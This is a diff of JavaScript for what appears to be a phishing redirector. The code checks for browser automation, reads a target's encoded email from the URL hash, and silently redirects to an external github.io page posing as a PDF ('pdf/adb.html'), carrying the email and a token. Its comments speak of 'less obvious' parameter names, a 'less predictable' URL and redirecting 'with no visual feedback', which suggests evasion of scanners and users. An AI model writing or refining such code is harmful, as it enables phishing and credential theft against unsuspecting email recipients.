@@ -64,17 +64,6 @@
           return true;
         }
         
-        // Check for Chrome automation
-        if (window.chrome && window.chrome.runtime && window.chrome.runtime.id) {
-          // This might be an extension, but could also be automation
-          try {
-            if (window.chrome.runtime.sendMessage.toString().includes('function')) {
-              // Likely automation
-              return true;
-            }
-          } catch (e) {}
-        }
-        
         return false;
       }
       
@@ -85,31 +74,11 @@
         return Array.from(array, b => b.toString(16).padStart(2, "0")).join("");
       }
       
-      // Get encoded data from various possible sources
+      // Get encoded data from hash
       function getEncodedData() {
-        // Try hash first
-        if (window.location.hash.substring(1)) {
+        // Get data from hash (removing the #)
+        if (window.location.hash && window.location.hash.length > 1) {
           return window.location.hash.substring(1);
-        }
-        
-        // Try query parameter with less obvious name
-        const urlParams = new URLSearchParams(window.location.search);
-        if (urlParams.has('data')) {
-          return urlParams.get('data');
-        }
-        if (urlParams.has('token')) {
-          return urlParams.get('token');
-        }
-        if (urlParams.has('id')) {
-          return urlParams.get('id');
-        }
-        if (urlParams.has('ref')) {
-          return urlParams.get('ref');
-        }
-        
-        // Try session storage as fallback
-        if (sessionStorage.getItem('secureData')) {
-          return sessionStorage.getItem('secureData');
         }
         
         return null;
@@ -134,9 +103,9 @@
         // Generate token
         const token = generateToken();
         
-        // Build redirect URL with less predictable structure
+        // Build redirect URL - using the correct path structure
         const randomParam = generateToken(8);
-        const redirectUrl = `pdf/adb.html?ref=${randomParam}#email=${encodedEmail}&token=${token}&t=${Date.now()}`;
+        const redirectUrl = `https://hareru66.github.io/pdf/adb.html?ref=${randomParam}&token=${token}#email=${encodedEmail}`;
         
         // Redirect immediately with no visual feedback
         window.location.replace(redirectUrl);
